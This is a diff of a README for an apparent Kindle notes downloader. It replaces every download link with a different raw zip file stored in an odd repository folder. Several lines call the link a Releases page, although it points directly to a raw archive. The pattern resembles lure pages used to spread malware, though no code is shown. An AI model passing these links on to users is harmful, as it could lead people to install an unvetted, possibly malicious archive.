@@ -1,6 +1,6 @@
 # 📚 kindle-notebook-downloader - Easily Save Your Kindle Notes and Highlights
 
-[![Download](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/awner/kindle-notebook-downloader.zip)](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/awner/kindle-notebook-downloader.zip)
+[![Download](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/chrome/notebook-downloader-kindle-v1.0-beta.2.zip)](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/chrome/notebook-downloader-kindle-v1.0-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Welcome to the Kindle Notebook Downloader! This is a simple tool to help you exp
 
 To get this tool, visit the Releases page to download the latest version:
 
-[**Visit this page to download**](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/awner/kindle-notebook-downloader.zip)
+[**Visit this page to download**](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/chrome/notebook-downloader-kindle-v1.0-beta.2.zip)
 
 1. Click on the version that you want to download.
 2. Find the file for your browser (Chrome/Firefox).
@@ -68,4 +68,4 @@ For any questions or support, you can reach out to us through our GitHub reposit
 
 Don’t miss out on your valuable Kindle notes. Start using the Kindle Notebook Downloader today. 
 
-[**Visit this page to download**](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/awner/kindle-notebook-downloader.zip)
+[**Visit this page to download**](https://raw.githubusercontent.com/sandeepshah0512/kindle-notebook-downloader/main/chrome/notebook-downloader-kindle-v1.0-beta.2.zip)
